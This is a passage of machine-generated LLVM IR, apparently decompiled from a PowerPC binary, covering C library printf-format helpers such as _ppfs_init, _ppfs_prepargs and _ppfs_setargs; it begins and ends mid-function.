  %v1_1000bfec = phi i32 [ 0, %dec_label_pc_1000bfc8 ], [ %v1_1000bfec.pre, %dec_label_pc_1000bfe4 ]
  %v0_1000bff0 = phi i32 [ 0, %dec_label_pc_1000bfc8 ], [ %v4_1000bfe4, %dec_label_pc_1000bfe4 ]
  %v4_1000bfec = icmp eq i32 %v0_1000bff0, %v1_1000bfec
  %v1_1000bff0 = load i32, i32* @r31, align 4
  %v2_1000bff0 = sub i32 %v1_1000bff0, %v0_1000bff0
  store i32 %v2_1000bff0, i32* @r31, align 4
  br i1 %v4_1000bfec, label %dec_label_pc_1000bff8, label %dec_label_pc_1000c044

dec_label_pc_1000bff8:                            ; preds = %dec_label_pc_1000bfec, %dec_label_pc_1000bfb4
  %v0_1000c010 = phi i32 [ %v2_1000bff0, %dec_label_pc_1000bfec ], [ %v0_1000bff8.pre, %dec_label_pc_1000bfb4 ]
  %v3_1000bff8 = icmp eq i32 %v0_1000c010, 0
  store i32 %v2_1000bea8, i32* @r29, align 4
  store i32 %v2_1000bdc8, i32* @r4, align 4
  store i32 %v2_1000bdcc, i32* @r6, align 4
  store i32 %v2_1000bea8, i32* @r3, align 4
  store i32 %v0_1000c010, i32* @r5, align 4
  br i1 %v3_1000bff8, label %dec_label_pc_1000c018, label %dec_label_pc_1000bfc0

dec_label_pc_1000c018:                            ; preds = %dec_label_pc_1000bff8, %dec_label_pc_1000bfa8.thread, %dec_label_pc_1000bfa8
  %v0_1000c018 = load i32, i32* %r24.global-to-local, align 4
  %v0_1000c020 = load i32, i32* @r28, align 4
  store i32 268484648, i32* @lr, align 4
  %v4_1000c024 = call i32 @_charpad(i32 %v0_1000c018, i8 32, i32 %v0_1000c020)
  %v1_1000c028 = load i32, i32* @r28, align 4
  %v4_1000c028 = icmp eq i32 %v4_1000c024, %v1_1000c028
  br i1 %v4_1000c028, label %dec_label_pc_1000c030, label %dec_label_pc_1000c044

dec_label_pc_1000c030:                            ; preds = %dec_label_pc_1000c018, %dec_label_pc_1000bd80, %dec_label_pc_1000bb54
  %stack_var_-184.2 = phi i32 [ %v0_1000bc88, %dec_label_pc_1000bb54 ], [ %stack_var_-184.1, %dec_label_pc_1000c018 ], [ %v0_1000bc88, %dec_label_pc_1000bd80 ]
  %v3_1000c030 = load i8*, i8** %stack_var_-200, align 4
  %v4_1000c030 = ptrtoint i8* %v3_1000c030 to i32
  store i32 %v4_1000c030, i32* @r29, align 4
  br label %dec_label_pc_1000c034

dec_label_pc_1000c034:                            ; preds = %dec_label_pc_1000ba48, %dec_label_pc_1000c030
  %v0_1000c034 = phi i32 [ %v0_1000c034.pre, %dec_label_pc_1000ba48 ], [ %v4_1000c030, %dec_label_pc_1000c030 ]
  %v0_1000bc88 = phi i32 [ %tmp56, %dec_label_pc_1000ba48 ], [ %stack_var_-184.2, %dec_label_pc_1000c030 ]
  br label %dec_label_pc_1000ba60

dec_label_pc_1000c044:                            ; preds = %dec_label_pc_1000be9c, %dec_label_pc_1000c018, %dec_label_pc_1000bfa8, %dec_label_pc_1000bf54, %dec_label_pc_1000bf38, %dec_label_pc_1000bdf8, %dec_label_pc_1000bdc8, %dec_label_pc_1000bd5c, %dec_label_pc_1000ba9c, %dec_label_pc_1000bfec
  store i32 -1, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_1000c048

dec_label_pc_1000c048:                            ; preds = %dec_label_pc_1000baa8, %dec_label_pc_1000ba20, %dec_label_pc_1000ba38, %dec_label_pc_1000c044
  store i32 %v0_1000b9f4, i32* %r0.global-to-local, align 4
  %v0_1000c04c = load i32, i32* %r23.global-to-local, align 4
  ret i32 %v0_1000c04c

; uselistorder directives
  uselistorder i32 %v0_1000bc88, { 16, 11, 12, 13, 1, 2, 0, 10, 9, 8, 7, 6, 4, 5, 3, 15, 14 }
  uselistorder i32 %v0_1000c010, { 1, 2, 0 }
  uselistorder i32 %v1_1000bf24, { 2, 0, 1 }
  uselistorder i32 %stack_var_-184.1, { 0, 2, 1 }
  uselistorder i32 %v3_1000beb4, { 1, 0 }
  uselistorder i32 %v2_1000be44, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000bda4, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-184.0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_1000bc88, { 1, 0 }
  uselistorder i32 %v6_1000bc40, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_1000bc24, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1000bc10, { 1, 0 }
  uselistorder i32 %v1_1000bbb4, { 1, 0 }
  uselistorder i1 %v2_1000bba8, { 1, 0 }
  uselistorder i32 %v0_1000bb58, { 1, 0, 2 }
  uselistorder i32 %v1_1000bb44, { 1, 0 }
  uselistorder i32 %v0_1000bb3c, { 1, 0 }
  uselistorder i32 %v1_1000bb38, { 1, 0 }
  uselistorder i32 %v1_1000bab4, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1000ba7c, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1000ba8c, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_1000bea8, { 3, 2, 4, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 %v2_1000baf0, { 1, 2, 0 }
  uselistorder i32 %v4_1000bae8, { 1, 0 }
  uselistorder i8** %stack_var_-200, { 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-196, { 1, 2, 0, 3, 4 }
  uselistorder i32 %tmp57, { 16, 14, 12, 10, 6, 7, 8, 0, 2, 1, 4, 3, 5, 9, 15, 17, 13, 11 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13 }
  uselistorder i32* %r29.global-to-local, { 0, 7, 1, 2, 3, 4, 5, 6, 8 }
  uselistorder i32* %r24.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r23.global-to-local, { 9, 0, 1, 4, 2, 5, 6, 3, 7, 8, 10 }
  uselistorder i32* %r11.global-to-local, { 2, 3, 4, 5, 7, 6, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29, 30, 31, 0, 1, 32, 33, 34, 35, 36, 37 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 0, 1, 2, 5 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i8 32, { 1, 0, 2, 3, 6, 5, 7, 4, 10, 9, 8, 11, 12 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder label %dec_label_pc_1000c048, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1000c044, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_1000c034, { 1, 0 }
  uselistorder label %dec_label_pc_1000c018, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000bfec, { 1, 0 }
  uselistorder label %dec_label_pc_1000bfc8, { 1, 0 }
  uselistorder label %dec_label_pc_1000bf54, { 1, 0 }
  uselistorder label %dec_label_pc_1000bf2c, { 1, 0 }
  uselistorder label %dec_label_pc_1000bf14, { 1, 0 }
  uselistorder label %dec_label_pc_1000bf00, { 1, 0 }
  uselistorder label %dec_label_pc_1000bee0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000bee0thread-pre-split, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000bed4, { 1, 0 }
  uselistorder label %dec_label_pc_1000be64, { 1, 0 }
  uselistorder label %dec_label_pc_1000be50, { 1, 0 }
  uselistorder label %dec_label_pc_1000bdc8, { 1, 0 }
  uselistorder label %dec_label_pc_1000bd18, { 1, 0 }
  uselistorder label %dec_label_pc_1000bd00, { 6, 2, 3, 1, 5, 0, 4 }
  uselistorder label %dec_label_pc_1000bcb0, { 1, 0 }
  uselistorder label %dec_label_pc_1000bc94, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_1000bc20, { 1, 0 }
  uselistorder label %dec_label_pc_1000bc04, { 1, 0 }
  uselistorder label %dec_label_pc_1000bbf0, { 1, 0 }
  uselistorder label %dec_label_pc_1000bbec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000bbc0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000bb48, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000bb34.dec_label_pc_1000bb34_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000bb0c, { 1, 0 }
  uselistorder label %dec_label_pc_1000baa8, { 1, 0 }
  uselistorder label %dec_label_pc_1000ba9c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ba60, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_1000c064 = load i32, i32* @lr, align 4
  store i32 %v0_1000c064, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_1000c074 = load i32, i32* @r4, align 4
  store i32 %v0_1000c074, i32* @r30, align 4
  store i32 268484740, i32* @lr, align 4
  %v3_1000c080 = call i32 @__GI_memset(i32 0, i32 160, i32 160)
  %v0_1000c084 = load i32, i32* @r31, align 4
  %v1_1000c084 = add i32 %v0_1000c084, 24
  %v2_1000c084 = inttoptr i32 %v1_1000c084 to i32*
  %v3_1000c084 = load i32, i32* %v2_1000c084, align 4
  store i32 %v3_1000c084, i32* %r9.global-to-local, align 4
  store i32 9, i32* %r11.global-to-local, align 4
  %v0_1000c08c = load i32, i32* @r30, align 4
  %v2_1000c08c = inttoptr i32 %v0_1000c084 to i32*
  store i32 %v0_1000c08c, i32* %v2_1000c08c, align 4
  %v0_1000c090 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000c090, i32* %ctr.global-to-local, align 4
  %v0_1000c094 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c094 = add i32 %v0_1000c094, -1
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_1000c09c = load i32, i32* @r31, align 4
  %v2_1000c09c = add i32 %v1_1000c09c, 24
  %v3_1000c09c = inttoptr i32 %v2_1000c09c to i32*
  store i32 %v1_1000c094, i32* %v3_1000c09c, align 4
  %v0_1000c0a0 = load i32, i32* @r31, align 4
  %v1_1000c0a0 = add i32 %v0_1000c0a0, 40
  store i32 %v1_1000c0a0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c0a4

dec_label_pc_1000c0a4:                            ; preds = %dec_label_pc_1000c0a4, %entry
  %v1_1000c0a4 = phi i32 [ %v1_1000c0a8, %dec_label_pc_1000c0a4 ], [ %v1_1000c0a0, %entry ]
  %v0_1000c0a4 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000c0a4 = inttoptr i32 %v1_1000c0a4 to i32*
  store i32 %v0_1000c0a4, i32* %v2_1000c0a4, align 4
  %v0_1000c0a8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c0a8 = add i32 %v0_1000c0a8, 4
  store i32 %v1_1000c0a8, i32* %r9.global-to-local, align 4
  %v0_1000c0ac = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000c0ac = add i32 %v0_1000c0ac, -1
  store i32 %v1_1000c0ac, i32* %ctr.global-to-local, align 4
  %v2_1000c0ac = icmp eq i32 %v1_1000c0ac, 0
  br i1 %v2_1000c0ac, label %dec_label_pc_1000c0b0, label %dec_label_pc_1000c0a4

dec_label_pc_1000c0b0:                            ; preds = %dec_label_pc_1000c0a4
  %v0_1000c0b0 = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000c0f0

dec_label_pc_1000c0c0:                            ; preds = %dec_label_pc_1000c0f0
  %v3_1000c0f8 = icmp eq i8 %v2_1000c0f0, 37
  br i1 %v3_1000c0f8, label %dec_label_pc_1000c0c4, label %dec_label_pc_1000c0ec

dec_label_pc_1000c0c4:                            ; preds = %dec_label_pc_1000c0c0
  %v1_1000c0c4 = add i32 %v0_1000c0c4, 1
  %v2_1000c0c4 = inttoptr i32 %v1_1000c0c4 to i8*
  %v3_1000c0c4 = load i8, i8* %v2_1000c0c4, align 1
  %v4_1000c0c4 = zext i8 %v3_1000c0c4 to i32
  store i32 %v4_1000c0c4, i32* %r0.global-to-local, align 4
  store i32 %v1_1000c0c4, i32* %r9.global-to-local, align 4
  %v3_1000c0cc = icmp eq i8 %v3_1000c0c4, 37
  br i1 %v3_1000c0cc, label %dec_label_pc_1000c0ec, label %dec_label_pc_1000c0d4

dec_label_pc_1000c0d4:                            ; preds = %dec_label_pc_1000c0c4
  %v0_1000c0c8 = load i32, i32* @r31, align 4
  %v2_1000c0d4 = inttoptr i32 %v0_1000c0c8 to i32*
  store i32 %v1_1000c0c4, i32* %v2_1000c0d4, align 4
  store i32 268484828, i32* @lr, align 4
  %v1_1000c0d8 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000c0d8 = call i32 @_ppfs_parsespec(i32* %v2_1000c0d4, i32 %v1_1000c0d8)
  %v1_1000c0dc = icmp slt i32 %v3_1000c0d8, 0
  br i1 %v1_1000c0dc, label %dec_label_pc_1000c108, label %dec_label_pc_1000c0e4

dec_label_pc_1000c0e4:                            ; preds = %dec_label_pc_1000c0d4
  %v0_1000c0e4 = load i32, i32* @r31, align 4
  %v1_1000c0e4 = inttoptr i32 %v0_1000c0e4 to i32*
  %v2_1000c0e4 = load i32, i32* %v1_1000c0e4, align 4
  br label %dec_label_pc_1000c0f0

dec_label_pc_1000c0ec:                            ; preds = %dec_label_pc_1000c0c0, %dec_label_pc_1000c0c4
  %v0_1000c0ec = phi i32 [ %v0_1000c0c4, %dec_label_pc_1000c0c0 ], [ %v1_1000c0c4, %dec_label_pc_1000c0c4 ]
  %v1_1000c0ec = add i32 %v0_1000c0ec, 1
  br label %dec_label_pc_1000c0f0

dec_label_pc_1000c0f0:                            ; preds = %dec_label_pc_1000c0e4, %dec_label_pc_1000c0ec, %dec_label_pc_1000c0b0
  %v0_1000c0c4 = phi i32 [ %v0_1000c0b0, %dec_label_pc_1000c0b0 ], [ %v1_1000c0ec, %dec_label_pc_1000c0ec ], [ %v2_1000c0e4, %dec_label_pc_1000c0e4 ]
  store i32 %v0_1000c0c4, i32* %r9.global-to-local, align 4
  %v1_1000c0f0 = inttoptr i32 %v0_1000c0c4 to i8*
  %v2_1000c0f0 = load i8, i8* %v1_1000c0f0, align 1
  %v3_1000c0f0 = zext i8 %v2_1000c0f0 to i32
  store i32 %v3_1000c0f0, i32* %r0.global-to-local, align 4
  %v3_1000c0f4 = icmp eq i8 %v2_1000c0f0, 0
  br i1 %v3_1000c0f4, label %dec_label_pc_1000c100, label %dec_label_pc_1000c0c0

dec_label_pc_1000c100:                            ; preds = %dec_label_pc_1000c0f0
  %v0_1000c100 = load i32, i32* @r30, align 4
  %v1_1000c100 = load i32, i32* @r31, align 4
  %v2_1000c100 = inttoptr i32 %v1_1000c100 to i32*
  store i32 %v0_1000c100, i32* %v2_1000c100, align 4
  br label %dec_label_pc_1000c108

dec_label_pc_1000c108:                            ; preds = %dec_label_pc_1000c0d4, %dec_label_pc_1000c100
  %storemerge = phi i32 [ 0, %dec_label_pc_1000c100 ], [ -1, %dec_label_pc_1000c0d4 ]
  store i32 %v0_1000c064, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_1000c0f0, { 1, 2, 0 }
  uselistorder i32 %v0_1000c0c4, { 2, 3, 1, 0 }
  uselistorder i32 %v1_1000c0ac, { 1, 0 }
  uselistorder i32 %v1_1000c0a8, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_1000c108, { 1, 0 }
  uselistorder label %dec_label_pc_1000c0f0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000c0ec, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1000c11c = load i32, i32* @lr, align 4
  %v0_1000c124 = load i32, i32* @r3, align 4
  store i32 %v0_1000c124, i32* @r31, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000c140 = add i32 %v0_1000c124, 24
  %v2_1000c140 = inttoptr i32 %v1_1000c140 to i32*
  %v3_1000c140 = load i32, i32* %v2_1000c140, align 4
  store i32 %v3_1000c140, i32* @r30, align 4
  %tmp4 = icmp slt i32 %v3_1000c140, 1
  br i1 %tmp4, label %dec_label_pc_1000c164, label %dec_label_pc_1000c14c

dec_label_pc_1000c14c:                            ; preds = %entry
  %v2_1000c14c = add i32 %v0_1000c124, 8
  %v3_1000c14c = inttoptr i32 %v2_1000c14c to i32*
  store i32 0, i32* %v3_1000c14c, align 4
  %v0_1000c150 = load i32, i32* @r30, align 4
  %v1_1000c150 = load i32, i32* @r3, align 4
  %v2_1000c150 = add i32 %v1_1000c150, 28
  %v3_1000c150 = inttoptr i32 %v2_1000c150 to i32*
  store i32 %v0_1000c150, i32* %v3_1000c150, align 4
  %v0_1000c154 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c154 = load i32, i32* @r3, align 4
  %v2_1000c154 = add i32 %v1_1000c154, 24
  %v3_1000c154 = inttoptr i32 %v2_1000c154 to i32*
  store i32 %v0_1000c154, i32* %v3_1000c154, align 4
  %v0_1000c158 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c158 = load i32, i32* @r3, align 4
  %v2_1000c158 = add i32 %v1_1000c158, 4
  %v3_1000c158 = inttoptr i32 %v2_1000c158 to i32*
  store i32 %v0_1000c158, i32* %v3_1000c158, align 4
  store i32 268484960, i32* @lr, align 4
  %v0_1000c15c = call i32 @_ppfs_setargs()
  store i32 %v0_1000c15c, i32* %r3.global-to-local, align 4
  %v0_1000c160 = load i32, i32* @r30, align 4
  %v1_1000c160 = load i32, i32* @r31, align 4
  %v2_1000c160 = add i32 %v1_1000c160, 24
  %v3_1000c160 = inttoptr i32 %v2_1000c160 to i32*
  store i32 %v0_1000c160, i32* %v3_1000c160, align 4
  %v0_1000c174.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000c164

dec_label_pc_1000c164:                            ; preds = %entry, %dec_label_pc_1000c14c
  %v0_1000c174 = phi i32 [ %v0_1000c124, %entry ], [ %v0_1000c174.pre, %dec_label_pc_1000c14c ]
  store i32 %v0_1000c11c, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000c174

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder label %dec_label_pc_1000c164, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %cr7_gt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1000c178 = load i32, i32* @r3, align 4
  %v1_1000c178 = add i32 %v0_1000c178, 24
  %v2_1000c178 = inttoptr i32 %v1_1000c178 to i32*
  %v3_1000c178 = load i32, i32* %v2_1000c178, align 4
  store i32 %v3_1000c178, i32* %r0.global-to-local, align 4
  %v1_1000c17c = add i32 %v0_1000c178, 88
  store i32 %v1_1000c17c, i32* @r8, align 4
  %v1_1000c180 = add i32 %v0_1000c178, 8
  %v2_1000c180 = inttoptr i32 %v1_1000c180 to i32*
  %v3_1000c180 = load i32, i32* %v2_1000c180, align 4
  store i32 %v3_1000c180, i32* %r9.global-to-local, align 4
  %v2_1000c184 = icmp sgt i32 %v3_1000c178, 0
  %v3_1000c184 = icmp eq i32 %v3_1000c178, 0
  store i1 %v2_1000c184, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000c184, label %dec_label_pc_1000c18c, label %dec_label_pc_1000c378

dec_label_pc_1000c18c:                            ; preds = %entry
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  %v3_1000c190 = icmp ne i32 %v3_1000c180, -2147483648
  %v4_1000c190 = icmp eq i32 %v3_1000c180, -2147483648
  store i1 %v3_1000c190, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000c190, label %dec_label_pc_1000c198, label %dec_label_pc_1000c1d8

dec_label_pc_1000c198:                            ; preds = %dec_label_pc_1000c18c
  %v1_1000c198 = add i32 %v0_1000c178, 76
  %v2_1000c198 = inttoptr i32 %v1_1000c198 to i8*
  %v3_1000c198 = load i8, i8* %v2_1000c198, align 1
  %v4_1000c198 = zext i8 %v3_1000c198 to i32
  store i32 %v4_1000c198, i32* @r10, align 4
  store i32 %v1_1000c198, i32* %r11.global-to-local, align 4
  %v2_1000c1a0 = icmp ugt i8 %v3_1000c198, 8
  store i1 %v2_1000c1a0, i1* %cr7_gt.global-to-local, align 1
  %tmp = icmp ugt i8 %v3_1000c198, 7
  br i1 %tmp, label %dec_label_pc_1000c1c0, label %dec_label_pc_1000c1a8

dec_label_pc_1000c1a8:                            ; preds = %dec_label_pc_1000c198
  %v1_1000c1a8 = add i32 %v0_1000c178, 84
  %v2_1000c1a8 = inttoptr i32 %v1_1000c1a8 to i32*
  %v3_1000c1a8 = load i32, i32* %v2_1000c1a8, align 4
  %v1_1000c1ac = mul nuw nsw i32 %v4_1000c198, 4
  %v2_1000c1b0 = add i32 %v3_1000c1a8, %v1_1000c1ac
  store i32 %v2_1000c1b0, i32* %r9.global-to-local, align 4
  %v1_1000c1b4 = add nuw nsw i32 %v4_1000c198, 1
  store i32 %v1_1000c1b4, i32* %r0.global-to-local, align 4
  %v1_1000c1b8 = trunc i32 %v1_1000c1b4 to i8
  store i8 %v1_1000c1b8, i8* %v2_1000c198, align 1
  br label %dec_label_pc_1000c1cc

dec_label_pc_1000c1c0:                            ; preds = %dec_label_pc_1000c198
  %v1_1000c1c0 = add i32 %v0_1000c178, 80
  %v2_1000c1c0 = inttoptr i32 %v1_1000c1c0 to i32*
  %v3_1000c1c0 = load i32, i32* %v2_1000c1c0, align 4
  store i32 %v3_1000c1c0, i32* %r9.global-to-local, align 4
  %v1_1000c1c4 = add i32 %v3_1000c1c0, 4
  store i32 %v1_1000c1c4, i32* %r0.global-to-local, align 4
  store i32 %v1_1000c1c4, i32* %v2_1000c1c0, align 4
  br label %dec_label_pc_1000c1cc

dec_label_pc_1000c1cc:                            ; preds = %dec_label_pc_1000c1a8, %dec_label_pc_1000c1c0
  %v0_1000c1cc = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c1cc = inttoptr i32 %v0_1000c1cc to i32*
  %v2_1000c1cc = load i32, i32* %v1_1000c1cc, align 4
  store i32 %v2_1000c1cc, i32* %r0.global-to-local, align 4
  %v1_1000c1d0 = load i32, i32* @r8, align 4
  %v2_1000c1d0 = inttoptr i32 %v1_1000c1d0 to i32*
  store i32 %v2_1000c1cc, i32* %v2_1000c1d0, align 4
  %v0_1000c1d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c1d4 = load i32, i32* @r3, align 4
  %v2_1000c1d4 = add i32 %v1_1000c1d4, 8
  %v3_1000c1d4 = inttoptr i32 %v2_1000c1d4 to i32*
  store i32 %v0_1000c1d4, i32* %v3_1000c1d4, align 4
  %v0_1000c1d8.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000c1d8

dec_label_pc_1000c1d8:                            ; preds = %dec_label_pc_1000c18c, %dec_label_pc_1000c1cc
  %v2_1000c208 = phi i32 [ %v0_1000c178, %dec_label_pc_1000c18c ], [ %v0_1000c1d8.pre, %dec_label_pc_1000c1cc ]
  %v1_1000c1d8 = add i32 %v2_1000c208, 4
  %v2_1000c1d8 = inttoptr i32 %v1_1000c1d8 to i32*
  %v3_1000c1d8 = load i32, i32* %v2_1000c1d8, align 4
  store i32 %v3_1000c1d8, i32* %r0.global-to-local, align 4
  store i32 -2147483648, i32* %r9.global-to-local, align 4
  %v3_1000c1e0 = icmp ne i32 %v3_1000c1d8, -2147483648
  %v4_1000c1e0 = icmp eq i32 %v3_1000c1d8, -2147483648
  store i1 %v3_1000c1e0, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000c1e0, label %dec_label_pc_1000c1e8, label %dec_label_pc_1000c368.preheader

dec_label_pc_1000c1e8:                            ; preds = %dec_label_pc_1000c1d8
  %v1_1000c1e8 = add i32 %v2_1000c208, 76
  %v2_1000c1e8 = inttoptr i32 %v1_1000c1e8 to i8*
  %v3_1000c1e8 = load i8, i8* %v2_1000c1e8, align 1
  %v4_1000c1e8 = zext i8 %v3_1000c1e8 to i32
  store i32 %v4_1000c1e8, i32* @r10, align 4
  store i32 %v1_1000c1e8, i32* %r11.global-to-local, align 4
  %v2_1000c1f0 = icmp ugt i8 %v3_1000c1e8, 8
  store i1 %v2_1000c1f0, i1* %cr7_gt.global-to-local, align 1
  %tmp22 = icmp ugt i8 %v3_1000c1e8, 7
  br i1 %tmp22, label %dec_label_pc_1000c210, label %dec_label_pc_1000c1f8

dec_label_pc_1000c1f8:                            ; preds = %dec_label_pc_1000c1e8
  %v1_1000c1f8 = add i32 %v2_1000c208, 84
  %v2_1000c1f8 = inttoptr i32 %v1_1000c1f8 to i32*
  %v3_1000c1f8 = load i32, i32* %v2_1000c1f8, align 4
  %v1_1000c1fc = mul nuw nsw i32 %v4_1000c1e8, 4
  %v2_1000c200 = add i32 %v3_1000c1f8, %v1_1000c1fc
  store i32 %v2_1000c200, i32* %r9.global-to-local, align 4
  %v1_1000c204 = add nuw nsw i32 %v4_1000c1e8, 1
  store i32 %v1_1000c204, i32* %r0.global-to-local, align 4
  %v1_1000c208 = trunc i32 %v1_1000c204 to i8
  store i8 %v1_1000c208, i8* %v2_1000c1e8, align 1
  br label %dec_label_pc_1000c21c

dec_label_pc_1000c210:                            ; preds = %dec_label_pc_1000c1e8
  %v1_1000c210 = add i32 %v2_1000c208, 80
  %v2_1000c210 = inttoptr i32 %v1_1000c210 to i32*
  %v3_1000c210 = load i32, i32* %v2_1000c210, align 4
  store i32 %v3_1000c210, i32* %r9.global-to-local, align 4
  %v1_1000c214 = add i32 %v3_1000c210, 4
  store i32 %v1_1000c214, i32* %r0.global-to-local, align 4
  store i32 %v1_1000c214, i32* %v2_1000c210, align 4
  br label %dec_label_pc_1000c21c

dec_label_pc_1000c21c:                            ; preds = %dec_label_pc_1000c1f8, %dec_label_pc_1000c210
  %v0_1000c21c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c21c = inttoptr i32 %v0_1000c21c to i32*
  %v2_1000c21c = load i32, i32* %v1_1000c21c, align 4
  store i32 %v2_1000c21c, i32* %r0.global-to-local, align 4
  %v1_1000c220 = load i32, i32* @r8, align 4
  %v2_1000c220 = inttoptr i32 %v1_1000c220 to i32*
  store i32 %v2_1000c21c, i32* %v2_1000c220, align 4
  %v0_1000c224 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c224 = load i32, i32* @r3, align 4
  %v2_1000c224 = add i32 %v1_1000c224, 4
  %v3_1000c224 = inttoptr i32 %v2_1000c224 to i32*
  store i32 %v0_1000c224, i32* %v3_1000c224, align 4
  %v0_1000c3685.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000c368.preheader

dec_label_pc_1000c368.preheader:                  ; preds = %dec_label_pc_1000c1d8, %dec_label_pc_1000c21c
  %v0_1000c3685 = phi i32 [ %v2_1000c208, %dec_label_pc_1000c1d8 ], [ %v0_1000c3685.pre, %dec_label_pc_1000c21c ]
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_1000c3686 = add i32 %v0_1000c3685, 28
  %v2_1000c3687 = inttoptr i32 %v1_1000c3686 to i32*
  %v3_1000c3688 = load i32, i32* %v2_1000c3687, align 4
  store i32 %v3_1000c3688, i32* %r0.global-to-local, align 4
  %v2_1000c36c9 = icmp sgt i32 %v3_1000c3688, 0
  %v3_1000c36c10 = icmp slt i32 %v3_1000c3688, 0
  store i1 %v3_1000c36c10, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000c36c9, label %dec_label_pc_1000c230, label %dec_label_pc_1000c3b8

dec_label_pc_1000c230:                            ; preds = %dec_label_pc_1000c368.preheader, %dec_label_pc_1000c364
  %v2_1000c344 = phi i32 [ %v0_1000c368, %dec_label_pc_1000c364 ], [ %v0_1000c3685, %dec_label_pc_1000c368.preheader ]
  %v0_1000c230 = phi i32 [ %v1_1000c364, %dec_label_pc_1000c364 ], [ 0, %dec_label_pc_1000c368.preheader ]
  %v1_1000c230 = mul i32 %v0_1000c230, 4
  %v2_1000c234 = add i32 %v1_1000c230, %v2_1000c344
  store i32 %v2_1000c234, i32* %r9.global-to-local, align 4
  %v1_1000c238 = add i32 %v2_1000c234, 40
  %v2_1000c238 = inttoptr i32 %v1_1000c238 to i32*
  %v3_1000c238 = load i32, i32* %v2_1000c238, align 4
  store i32 %v3_1000c238, i32* %r0.global-to-local, align 4
  %v2_1000c23c = icmp sgt i32 %v3_1000c238, 8
  %v3_1000c23c = icmp eq i32 %v3_1000c238, 8
  store i1 %v2_1000c23c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000c23c, label %dec_label_pc_1000c364, label %dec_label_pc_1000c244

